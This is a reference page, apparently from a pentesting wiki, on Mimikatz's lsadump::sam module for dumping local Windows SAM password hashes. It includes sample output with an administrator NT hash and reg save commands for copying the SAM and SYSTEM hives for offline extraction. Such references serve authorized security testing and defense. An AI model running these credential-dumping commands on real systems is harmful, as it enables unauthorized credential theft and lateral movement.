# sam

`lsadump::sam` dumps the local Security Account Manager (SAM) NT hashes (cf. [SAM secrets dump](https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets)). It can operate directly on the target system, or offline with registry hives backups (for `SAM` and `SYSTEM`). It has the following command line arguments:

* `/sam`: the offline backup of the SAM hive
* `/system`: the offline backup of the SYSTEM hive

{% hint style="info" %}
LM and NT hashes are used to authenticate accounts using the NTLM protocol. These hashes are often called NTLM hash and many documentations, resources, blogpost and tools mix terms. In this case, "NTLM" refers to the NT hash.

([more information](https://www.thehacker.recipes/ad/movement/ntlm))
{% endhint %}

{% hint style="warning" %}
This command requires elevated privileges (by previously running [privilege::debug](https://tools.thehacker.recipes/mimikatz/modules/privilege/debug) or by executing Mimikatz as the `NT-AUTHORITY\SYSTEM` account).
{% endhint %}

### Dumping the target

```
mimikatz # lsadump::sam
Domain : DC
SysKey : 7852ea75b3b8c4093fbda3f618a045bb
Local SID : S-1-5-21-97532702-2134717100-614679475

SAMKey : 7a87c9ff42815d7d1cead9fe84db22ba

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 4d01f91984530f183381bdf5f0605f63

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount
```

### Offline dumping

At first a backup of`SYSTEM` and `SAM` hives must be obtained:

```powershell
reg save HKLM\SYSTEM system.hive
reg save HKLM\SAM sam.hive
```

A Volume Shadow Copy / BootCD can also be used to backup these files:

```
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\config\SAM
```

Then the saved backups of `SYSTEM` and `SAM` hives can also be used offline:

```
mimikatz # lsadump::sam /system:system.hive /sam:sam.hive
```
